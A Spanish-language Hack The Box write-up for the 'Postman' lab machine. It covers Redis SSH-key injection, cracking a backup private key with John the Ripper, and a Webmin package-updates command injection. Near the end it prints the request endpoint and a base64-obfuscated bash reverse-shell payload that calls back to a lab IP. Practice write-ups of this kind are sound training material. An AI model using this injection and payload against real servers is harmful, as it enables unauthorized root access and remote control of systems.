---
layout: post
title: Write-Up Máquina Postman HTB
date: 2021-01-14 01:23 +0800
last_modified_at: 2021-01-14 01:28 +0800
tags: [htb, writeup, ssh, Redis, Webmin, Linux]
toc:  true
---
![Postman-Card](/assets/imagenes/2021-01-14-postman-HTB/Postman-card.png)

---
## Introducción

La máquina Postman corre ins sistema linux de 64 bits y tiene un nivel de deificultad fácil. Para la explotación inicial, vamos a hacer uso de una vulnerabilidad de escritura de ficheros que afecta al servicio Redis entre las versiones 4.0 y 5.0. Posteriormente a esto vamos a utilizar una clave privada que se encentra en un directorio de la maquina para realizar un movimiento lateral y asi conseguir el user. Para la escalada de privilegios, vamos a hacer uso de una vulnerabilidad de rce en el servicio webmin con la que obtendremos una shell reversa.

---
## Escaneo

![Postman-nmap](/assets/imagenes/2021-01-14-postman-HTB/Postman-nmap.png)

El escaneo de la maquina nos revela que tenemos abiertos los puertos:
* 22 ----> SSH
* 80 ----> http
* 6379 --> Redis
* 10000 -> http

### Puerto 80 (apache)

En el puerto 80 nos encontramos con una web que dice estar en construccion:

![Postman-web](/assets/imagenes/2021-01-14-postman-HTB/Postman-web.png)

En este caso la web no aloja nada que nos interese para la explotación.

### Puerto 3679 (Redis)

Buscando informacion sobre la version de redis encontramos un articulo de medium que habla sobre [como obtener una rce en Redis](https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0).
Para nuestro caso vamos a modificar un poco los comandos que ejecuta, pero la base es la misma.
El procedimiento que vamos a seguir en este caso es crear un par de claves RSA  e inyectarlas al servidor Redis para escribirlas en el fichero authorized_keys del user redis.

### Puerto 10000 (Webmin)

En el puerto 10000 nos encontramos un webmin desactualizado del que no tenemos ningun tipo de credencial.

---

## Explotación

Lo primero, vamos a generar nuestro par de claves:

![Postman-id-rsa-redis](/assets/imagenes/2021-01-14-postman-HTB/Postman-id-rsa-redis.png)

Una vez generadas vamos a empezar a interactuar con el servidor redis para para inyectar nuestra clave publica en las claves autorizadas.

![Postman-explotacion](/assets/imagenes/2021-01-14-postman-HTB/Postman-explotacion-redis.png)

Una vez hecho esto, le asignamos los permisos correctos a nuestra clave privada (600) y nos conectamos por ssh.

![Postman-ssh](/assets/imagenes/2021-01-14-postman-HTB/Postman-ssh-redis.png)

---

## Movimiento lateral

Si nos vamos al directorio /opt, veremos un fichero llamado id_rsa.bak el cual es propiedad del user Matt.

![Postman-id_rsa.bak-dir](/assets/imagenes/2021-01-14-postman-HTB/Postman-id-rsa-matt-bak-opt.png)

Ya que tenemos la clave privada vamos a copiarla y a intentar crackearla con la herramienta john the ripper.
Pero primero tenemos que pasar la clave privada a un formato entendible para john, porlo que vamos a isar la herramienta `/usr/share/john/ssh2john.py`. El comando quedaria de la sigiente manera:
* /usr/share/john/ssh2john.py id_rsa.bak > id_rsa-bak.txt (Para las ultimas versiones de ParrotOs y Kali que no traen el paquete python hay que editar la primera linea del fichero y cambiar *python* por **python2.7**).

Una vez ejecutado ya podemos intentar crackear la clave.

![Postman-cracked-Matt](/assets/imagenes/2021-01-14-postman-HTB/Postman-cracked-matt.png)

**¡¡Ya tenemos una posible password para el user Matt!!**

Vamos a probarla.

![Postman-su-Matt](/assets/imagenes/2021-01-14-postman-HTB/Postman-su-Matt-succesful.png)

Ya somos Matt.

![Postman-Matt-flag](/assets/imagenes/2021-01-14-postman-HTB/Postman-prueba-Matt.png)

---

## Escalada de privilegios

Para la escalada de privilegios nos vamos a aprovechar de una vulneravilidad en el servicio webmin que nos permitira llamar a una shell reversa a traves de bash.

Primero vamos a encodear el comando en base64.

![Postman-bash-payload](/assets/imagenes/2021-01-14-postman-HTB/Postman-bash-payload.png)

Ahora generaremos el payload que vamos a mandar al servidor.

![Postman-peticion](/assets/imagenes/2021-01-14-postman-HTB/Postman-peticion.png)

* URL: 10.10.10.160:10000/package-updates/update.cgi
* Method: POST
* payload: u=acl%2Fapt&u=$(command)

En nuestro caso la string del comando
```bash
echo${IFS}YmFzaCAtYyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNi8xMjM0IDA%2bJjEn|base64${IFS}-d|bash
```
${IFS} se usa para sustituir los espacios y %2b es para sustituir los simbolos + y que no se transformen en espacios.

Con el listener levantado reciviremos la conexion.

![Postman-rev-shell-root](/assets/imagenes/2021-01-14-postman-HTB/Postman-rev-shell-root.png)








